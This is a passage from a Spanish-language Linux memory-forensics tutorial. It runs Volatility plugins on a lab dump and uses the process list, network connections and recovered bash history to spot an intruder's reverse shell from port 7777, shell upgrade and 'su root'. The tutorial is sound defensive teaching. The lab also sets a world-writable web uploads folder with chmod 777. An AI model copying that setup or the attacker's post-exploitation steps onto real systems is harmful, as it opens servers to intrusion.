0xffff8800b6995580 systemd              3384            1               1000            1000   0x00000000ba434000 2025-07-14 08:44:10 UTC+0000
0xffff8800b5da8e40 (sd-pam)             3386            3384            1000            1000   0x00000000bace0000 2025-07-14 08:44:10 UTC+0000
0xffff8800b5dae3c0 bash                 3390            3357            1000            1000   0x00000000b7782000 2025-07-14 08:44:10 UTC+0000
0xffff88003439d580 kworker/u256:2       3437            2               0               0      ------------------ 2025-07-14 08:58:14 UTC+0000
0xffff880135d20000 sudo                 3441            3390            0               1000   0x00000000b5e90000 2025-07-14 08:58:30 UTC+0000
0xffff880135d263c0 su                   3442            3441            0               0      0x00000000b696e000 2025-07-14 08:58:33 UTC+0000
0xffff88003439c740 bash                 3443            3442            0               0      0x00000000b7a86000 2025-07-14 08:58:33 UTC+0000
0xffff8800b6451c80 sshd                 5635            1               0               0      0x0000000137b50000 2025-07-14 09:05:24 UTC+0000
0xffff8800b7b22ac0 kworker/0:1          5643            2               0               0      ------------------ 2025-07-14 09:05:24 UTC+0000
0xffff8800b76a4740 kworker/1:1          12139           2               0               0      ------------------ 2025-07-14 09:07:44 UTC+0000
0xffff8800b76a0e40 apache2              12155           1               0               0      0x00000001376c4000 2025-07-14 09:07:45 UTC+0000
0xffff8800b7682ac0 apache2              12158           12155           33              33     0x0000000137636000 2025-07-14 09:07:45 UTC+0000
0xffff8800b7685580 apache2              12159           12155           33              33     0x0000000137776000 2025-07-14 09:07:45 UTC+0000
0xffff8800b76863c0 apache2              12160           12155           33              33     0x000000013601c000 2025-07-14 09:07:45 UTC+0000
0xffff8800b7680000 apache2              12161           12155           33              33     0x0000000137692000 2025-07-14 09:07:45 UTC+0000
0xffff8800b7684740 apache2              12162           12155           33              33     0x00000001356f8000 2025-07-14 09:07:45 UTC+0000
0xffff8800b76a0000 apache2              12166           12155           33              33     0x00000000ba472000 2025-07-14 09:08:05 UTC+0000
0xffff8800b5da8000 sh                   12223           12160           33              33     0x00000001360da000 2025-07-14 09:12:51 UTC+0000
0xffff8800ba14b900 sh                   12224           12223           33              33     0x00000001360ca000 2025-07-14 09:12:51 UTC+0000
0xffff8800b5da9c80 script               12226           12224           33              33     0x000000013608c000 2025-07-14 09:14:12 UTC+0000
0xffff8800b5dab900 sh                   12227           12226           33              33     0x00000000baeb0000 2025-07-14 09:14:12 UTC+0000
0xffff8800b5daaac0 bash                 12228           12227           33              33     0x00000000345f4000 2025-07-14 09:14:12 UTC+0000
0xffff8800b676b900 kworker/u256:1       12236           2               0               0      ------------------ 2025-07-14 09:14:50 UTC+0000
0xffff8800b676e3c0 kworker/0:3          12242           2               0               0      ------------------ 2025-07-14 09:14:58 UTC+0000
0xffff8800b676aac0 su                   12243           12228           33              0      0x00000000b7b6e000 2025-07-14 09:15:01 UTC+0000
0xffff8800ba148000 systemd              12244           1               0               0      0x00000000345c4000 2025-07-14 09:15:02 UTC+0000
0xffff8800b5dac740 (sd-pam)             12247           12244           0               0      0x00000000b69b8000 2025-07-14 09:15:02 UTC+0000
0xffff88003436aac0 bash                 12252           12243           0               0      0x00000000b769a000 2025-07-14 09:15:02 UTC+0000
0xffff880137ad8e40 sshd                 12279           5635            0               0      0x00000000b8a18000 2025-07-14 09:26:14 UTC+0000
0xffff8800ba110e40 sshd                 12305           12279           1000            1000   0x00000000bad32000 2025-07-14 09:26:15 UTC+0000
0xffff8800345f8e40 bash                 12306           12305           1000            1000   0x00000000b76b4000 2025-07-14 09:26:15 UTC+0000
0xffff8800b676c740 kworker/u256:0       12318           2               0               0      ------------------ 2025-07-14 09:26:16 UTC+0000
0xffff8800b676d580 sudo                 12329           12306           0               1000   0x00000000345e8000 2025-07-14 09:27:28 UTC+0000
0xffff8800b6768000 avml                 12330           12329           0               0      0x00000000345b8000 2025-07-14 09:27:28 UTC+0000
```

Con esto ya vamos viendo muchas mas cosas.

### Obtener información de las conexiones entrantes el sistema

```shell
./vol.py -f memory.raw --profile=LinuxUbuntu_4_4_0-186-generic_profilex64 linux_netstat
```

Info:

```
UNIX 10970              systemd/1     /run/systemd/private
UNIX 30677              systemd/1     
UNIX 10968              systemd/1     /run/systemd/notify
UNIX 33713              systemd/1     /run/systemd/journal/stdout
UNIX 10969              systemd/1     /run/systemd/cgroups-agent
UNIX 13272              systemd/1     /run/uuidd/request
UNIX 13273              systemd/1     /var/run/dbus/system_bus_socket
UNIX 10975              systemd/1     /run/systemd/fsck.progress
UNIX 10987              systemd/1     /run/udev/control
UNIX 25082              systemd/1     /run/systemd/journal/stdout
UNIX 15917              systemd/1     /run/systemd/journal/stdout
UNIX 12061              systemd/1     /run/systemd/journal/stdout
UNIX 12221              systemd/1     /run/systemd/journal/stdout
UNIX 13565              systemd/1     /run/systemd/journal/stdout
UNIX 13566              systemd/1     /run/systemd/journal/stdout
UNIX 14608              systemd/1     /run/systemd/journal/stdout
UNIX 14609              systemd/1     /run/systemd/journal/stdout
UNIX 15941              systemd/1     /run/systemd/journal/stdout
UNIX 13283              systemd/1     
UNIX 19320              systemd/1     /run/systemd/journal/stdout
UNIX 11097              systemd/1     /run/systemd/journal/syslog
UNIX 10979              systemd/1     /run/systemd/journal/dev-log
UNIX 10980              systemd/1     /run/systemd/journal/stdout
UNIX 10981              systemd/1     /run/systemd/journal/socket
UNIX 10980      systemd-journal/350   /run/systemd/journal/stdout
UNIX 10981      systemd-journal/350   /run/systemd/journal/socket
UNIX 10979      systemd-journal/350   /run/systemd/journal/dev-log
UNIX 12340      systemd-journal/350   
UNIX 15917      systemd-journal/350   /run/systemd/journal/stdout
UNIX 12061      systemd-journal/350   /run/systemd/journal/stdout
UNIX 15941      systemd-journal/350   /run/systemd/journal/stdout
UNIX 13566      systemd-journal/350   /run/systemd/journal/stdout
UNIX 19320      systemd-journal/350   /run/systemd/journal/stdout
UNIX 12221      systemd-journal/350   /run/systemd/journal/stdout
UNIX 13565      systemd-journal/350   /run/systemd/journal/stdout
UNIX 25082      systemd-journal/350   /run/systemd/journal/stdout
UNIX 33713      systemd-journal/350   /run/systemd/journal/stdout
UNIX 14608      systemd-journal/350   /run/systemd/journal/stdout
UNIX 14609      systemd-journal/350   /run/systemd/journal/stdout
UNIX 12418        systemd-udevd/396   
UNIX 12418        systemd-udevd/396   
UNIX 10987        systemd-udevd/396   /run/udev/control
UNIX 12424        systemd-udevd/396   
UNIX 12790        systemd-udevd/396   
UNIX 12791        systemd-udevd/396   
UNIX 12219      systemd-timesyn/471   
UNIX 12219      systemd-timesyn/471   
UNIX 13018      systemd-timesyn/471   
UNIX 13022      systemd-timesyn/471   
UNIX 13023      systemd-timesyn/471   
UNIX 13024      systemd-timesyn/471   
UNIX 13025      systemd-timesyn/471   
UNIX 11097             rsyslogd/627   /run/systemd/journal/syslog
UNIX 14457                 cron/632   
UNIX 14457                 cron/632   
UNIX 14406          dbus-daemon/634   
UNIX 14406          dbus-daemon/634   
UNIX 13273          dbus-daemon/634   /var/run/dbus/system_bus_socket
UNIX 13609          dbus-daemon/634   
UNIX 13612          dbus-daemon/634   
UNIX 13613          dbus-daemon/634   
UNIX 13614          dbus-daemon/634   /var/run/dbus/system_bus_socket
UNIX 13739          dbus-daemon/634   /var/run/dbus/system_bus_socket
UNIX 13773          dbus-daemon/634   /var/run/dbus/system_bus_socket
UNIX 13725       systemd-logind/667   
UNIX 13725       systemd-logind/667   
UNIX 14618       systemd-logind/667   
UNIX 14629       systemd-logind/667   
UNIX 14606      accounts-daemon/670   
UNIX 14606      accounts-daemon/670   
UNIX 14666      accounts-daemon/670   
UNIX 13208             dhclient/752   
UDP      0.0.0.0         :   68 0.0.0.0         :    0                          dhclient/752  
UNIX 15916             vmtoolsd/1431  
UNIX 15916             vmtoolsd/1431  
UNIX 16632        VGAuthService/1453  
UNIX 16632        VGAuthService/1453  
UNIX 15952        VGAuthService/1453  /var/run/vmware/guestServicePipe
UNIX 19844                login/3357  
UNIX 19901              systemd/3384  
UNIX 19901              systemd/3384  
UNIX 19328              systemd/3384  
UNIX 19920              systemd/3384  /run/user/1000/systemd/notify
UNIX 19921              systemd/3384  /run/user/1000/systemd/private
UNIX 19901             (sd-pam)/3386  
UNIX 19901             (sd-pam)/3386  
UNIX 19907             (sd-pam)/3386  
UNIX 20578                 sudo/3441  
UNIX 20581                 sudo/3441  
UNIX 21792                   su/3442  
UNIX 25916                 sshd/5635  
UNIX 25916                 sshd/5635  
TCP      0.0.0.0         :   22 0.0.0.0         :    0 LISTEN                       sshd/5635 
TCP      ::              :   22 ::              :    0 LISTEN                       sshd/5635 
TCP      0.0.0.0         :    0 0.0.0.0         :    0 CLOSE                     apache2/12155
TCP      ::              :   80 ::              :    0 LISTEN                    apache2/12155
TCP      0.0.0.0         :    0 0.0.0.0         :    0 CLOSE                     apache2/12158
TCP      ::              :   80 ::              :    0 LISTEN                    apache2/12158
TCP      0.0.0.0         :    0 0.0.0.0         :    0 CLOSE                     apache2/12159
TCP      ::              :   80 ::              :    0 LISTEN                    apache2/12159
TCP      0.0.0.0         :    0 0.0.0.0         :    0 CLOSE                     apache2/12160
TCP      ::              :   80 ::              :    0 LISTEN                    apache2/12160
TCP      0.0.0.0         :    0 0.0.0.0         :    0 CLOSE                     apache2/12161
TCP      ::              :   80 ::              :    0 LISTEN                    apache2/12161
TCP      0.0.0.0         :    0 0.0.0.0         :    0 CLOSE                     apache2/12162
TCP      ::              :   80 ::              :    0 LISTEN                    apache2/12162
TCP      0.0.0.0         :    0 0.0.0.0         :    0 CLOSE                     apache2/12166
TCP      ::              :   80 ::              :    0 LISTEN                    apache2/12166
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12223
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12223
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12223
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12223
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12224
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12224
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12224
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12224
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                script/12226
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                script/12226
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                script/12226
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                script/12226
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12227
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                  bash/12228
UNIX 33646                   su/12243 
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    su/12243
UNIX 33712              systemd/12244 
UNIX 33712              systemd/12244 
UNIX 33726              systemd/12244 
UNIX 33732              systemd/12244 /run/user/0/systemd/notify
UNIX 33733              systemd/12244 /run/user/0/systemd/private
UNIX 33712             (sd-pam)/12247 
UNIX 33712             (sd-pam)/12247 
UNIX 33719             (sd-pam)/12247 
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                  bash/12252
TCP      192.168.177.132 :   22 192.168.177.129 :48998 ESTABLISHED                  sshd/12279
UNIX 35285                 sshd/12279 
UNIX 35311                 sshd/12279 
TCP      192.168.177.132 :   22 192.168.177.129 :48998 ESTABLISHED                  sshd/12305
UNIX 35285                 sshd/12305 
UNIX 35310                 sshd/12305 
UNIX 35466                 sudo/12329 
UNIX 35469                 sudo/12329
```

Aqui ya estamos viendo varias cosas interesantes, entre ellas hay unas conexiones super sospechosas que estan en esta linea:

```
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12223
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12223
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12223
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12223
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12224
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12224
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12224
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12224
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                script/12226
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                script/12226
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                script/12226
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                script/12226
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    sh/12227
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                  bash/12228
UNIX 33646                   su/12243 
TCP      192.168.177.132 :34146 192.168.177.129 : 7777 ESTABLISHED                    su/12243
```

Podemos ver que la maquina atacante su `IP` es esta de aqui:

```
192.168.177.129
```

Que esta realizando una conexion inversa a la maquina victima, por lo que ya podemos ver que alguien se ha colado en el servidor.

### Obtener todos los comandos ejecutados en la bash

```shell
./vol.py -f memory.raw --profile=LinuxUbuntu_4_4_0-186-generic_profilex64 linux_bash
```

Info:

```
Pid      Name                 Command Time                   Command
-------- -------------------- ------------------------------ -------
    3390 bash                 2025-07-14 08:49:32 UTC+0000   clear
    3390 bash                 2025-07-14 08:50:00 UTC+0000   setxkbmap es
    3390 bash                 2025-07-14 08:50:06 UTC+0000   ls -la
    3390 bash                 2025-07-14 08:58:11 UTC+0000   apt install apache2
    3390 bash                 2025-07-14 08:58:17 UTC+0000   apt update
    3390 bash                 2025-07-14 08:58:29 UTC+0000   sudo su
    3443 bash                 2025-07-14 08:58:35 UTC+0000   clear
    3443 bash                 2025-07-14 08:58:44 UTC+0000   apt install apache2
    3443 bash                 2025-07-14 08:59:48 UTC+0000   clear
    3443 bash                 2025-07-14 08:59:55 UTC+0000   service apache2 start
    3443 bash                 2025-07-14 09:04:56 UTC+0000   ip a
    3443 bash                 2025-07-14 09:05:17 UTC+0000   apt install ssh
    3443 bash                 2025-07-14 09:05:31 UTC+0000   service ssh start
    3443 bash                 2025-07-14 09:05:33 UTC+0000   clear
    3443 bash                 2025-07-14 09:24:34 UTC+0000   wget 
   12228 bash                 2025-07-14 09:14:19 UTC+0000   reset xterm
   12228 bash                 2025-07-14 09:14:25 UTC+0000   export SHELL=/bin/bash
   12228 bash                 2025-07-14 09:14:25 UTC+0000   export TERM=xterm
   12228 bash                 2025-07-14 09:14:26 UTC+0000   clear
   12228 bash                 2025-07-14 09:14:38 UTC+0000   stty rows 32 columns 157
   12228 bash                 2025-07-14 09:14:40 UTC+0000   clear
   12228 bash                 2025-07-14 09:15:01 UTC+0000   su root
   12252 bash                 2025-07-14 09:15:01 UTC+0000   ip a
   12252 bash                 2025-07-14 09:15:01 UTC+0000   ls -la
   12252 bash                 2025-07-14 09:15:01 UTC+0000   clear
   12252 bash                 2025-07-14 09:15:01 UTC+0000   sudo mkdir -p /var/www/html/uploads
   12252 bash                 2025-07-14 09:15:01 UTC+0000   exit
   12252 bash                 2025-07-14 09:15:01 UTC+0000   nano index.php
   12252 bash                 2025-07-14 09:15:01 UTC+0000   ls -la
   12252 bash                 2025-07-14 09:15:01 UTC+0000   cd /var/www/html/
   12252 bash                 2025-07-14 09:15:01 UTC+0000   rm index.html 
   12252 bash                 2025-07-14 09:15:01 UTC+0000   sudo a2enmod php*
   12252 bash                 2025-07-14 09:15:01 UTC+0000   service apache2 restart
   12252 bash                 2025-07-14 09:15:01 UTC+0000   sudo chmod 777 /var/www/html/uploads
   12252 bash                 2025-07-14 09:15:01 UTC+0000   sudo apt install apache2 php libapache2-mod-php -y
   12252 bash                 2025-07-14 09:15:01 UTC+0000   clear
   12252 bash                 2025-07-14 09:15:01 UTC+0000   passwd root
   12252 bash                 2025-07-14 09:15:06 UTC+0000   cd ~
   12252 bash                 2025-07-14 09:15:08 UTC+0000   clear
   12252 bash                 2025-07-14 09:15:11 UTC+0000   whoami
   12306 bash                 2025-07-14 09:26:15 UTC+0000   sudo su
   12306 bash                 2025-07-14 09:26:15 UTC+0000   exit
   12306 bash                 2025-07-14 09:26:15 UTC+0000   clear
   12306 bash                 2025-07-14 09:26:22 UTC+0000   sudo wget https://github.com/microsoft/avml/releases/download/v0.11.4/avml
   12306 bash                 2025-07-14 09:26:27 UTC+0000   ls -la
   12306 bash                 2025-07-14 09:26:33 UTC+0000   chmod +x avml 
   12306 bash                 2025-07-14 09:26:36 UTC+0000   sudo chmod +x avml 
   12306 bash                 2025-07-14 09:26:37 UTC+0000   ls -la
   12306 bash                 2025-07-14 09:27:28 UTC+0000   sudo ./avml memory.raw
```

Con esto veremos esta parte de aqui interesante:

```
12228 bash                 2025-07-14 09:14:19 UTC+0000   reset xterm
   12228 bash                 2025-07-14 09:14:25 UTC+0000   export SHELL=/bin/bash
   12228 bash                 2025-07-14 09:14:25 UTC+0000   export TERM=xterm
   12228 bash                 2025-07-14 09:14:26 UTC+0000   clear
   12228 bash                 2025-07-14 09:14:38 UTC+0000   stty rows 32 columns 157
   12228 bash                 2025-07-14 09:14:40 UTC+0000   clear
   12228 bash                 2025-07-14 09:15:01 UTC+0000   su root
```

Vemos que esos comandos no los ejecutamos nosotros, si no la maquina atacante, ya viendo esto podremos ver que se ha colado alguien al servidor y no vemos que en ningun momento se haya desconectado, tambien sabemos su `IP` gracias a las conexiones abiertas en el sistema.

### Dumpearnos un proceso a nuestro host del dump

Si por ejemplo hemos visto algun proceso sospechoso que queremos analizar, haremos lo siguiente:

```shell
./vol.py -f memory.raw --profile=LinuxUbuntu_4_4_0-186-generic_profilex64 linux_procdump -p <PID> -D ./dumped
```

Y despues con `strings` poder ver dicho `dump` del proceso.

```shell
strings ./dumped/<PID>.elf
```

Con esto ya habremos visto los comandos principales a utilizar en caso de un Analisis Forense`para`Linux\`\`.
